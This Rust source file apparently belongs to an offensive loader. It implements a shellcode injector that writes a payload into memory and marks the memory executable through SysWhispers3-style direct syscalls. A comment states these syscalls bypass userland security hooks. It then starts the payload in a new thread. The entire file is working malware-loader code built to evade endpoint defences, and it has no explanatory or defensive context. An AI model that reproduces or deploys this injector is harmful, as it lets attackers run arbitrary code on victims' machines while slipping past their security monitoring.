use std::ffi::c_void;

const MEM_COMMIT: u32 = 0x00001000;
const MEM_RESERVE: u32 = 0x00002000;
const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE_READ: u32 = 0x20;
const INFINITE: u32 = 0xFFFFFFFF;

#[link(name = "kernel32")]
unsafe extern "system" {
    fn VirtualAlloc(
        lp_address: *mut c_void,
        dw_size: usize,
        fl_allocation_type: u32,
        fl_protect: u32,
    ) -> *mut c_void;

    fn CreateThread(
        lp_thread_attributes: *mut c_void,
        dw_stack_size: usize,
        lp_start_address: *mut c_void,
        lp_parameter: *mut c_void,
        dw_creation_flags: u32,
        lp_thread_id: *mut u32,
    ) -> *mut c_void;

    fn WaitForSingleObject(h_handle: *mut c_void, dw_milliseconds: u32) -> u32;
}

// Dynamically resolves the SSN from NTDLL's export table via SysWhispers3 hash lookup,
// then executes the syscall instruction directly — bypassing any userland hooks.
unsafe extern "C" {
    pub fn Sw3NtWriteVirtualMemory(
        process_handle: *mut c_void,
        base_address: *mut c_void,
        buffer: *const c_void,
        number_of_bytes: usize,
        number_of_bytes_written: *mut usize,
    ) -> i32;

    pub fn Sw3NtProtectVirtualMemory(
        process_handle: *mut c_void,
        base_address: *mut *mut c_void,
        region_size: *mut usize,
        new_protect: u32,
        old_protect: *mut u32,
    ) -> i32;
}

/// Writes shellcode into RW memory, flips to RX via direct syscalls, then executes it.
pub unsafe fn inject(shellcode: &[u8]) -> bool {
    let current_process = -1isize as *mut c_void;

    let mem = unsafe {
        VirtualAlloc(
            std::ptr::null_mut(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };
    if mem.is_null() {
        return false;
    }

    let mut bytes_written: usize = 0;
    let status = unsafe {
        Sw3NtWriteVirtualMemory(
            current_process,
            mem,
            shellcode.as_ptr() as *const c_void,
            shellcode.len(),
            &mut bytes_written,
        )
    };
    if status != 0 {
        return false;
    }

    let mut base = mem;
    let mut region_size = shellcode.len();
    let mut old_protect: u32 = 0;
    let status = unsafe {
        Sw3NtProtectVirtualMemory(
            current_process,
            &mut base,
            &mut region_size,
            PAGE_EXECUTE_READ,
            &mut old_protect,
        )
    };
    if status != 0 {
        return false;
    }

    let thread = unsafe {
        CreateThread(
            std::ptr::null_mut(),
            0,
            mem,
            std::ptr::null_mut(),
            0,
            std::ptr::null_mut(),
        )
    };
    if thread.is_null() {
        return false;
    }

    unsafe { WaitForSingleObject(thread, INFINITE) };
    true
}
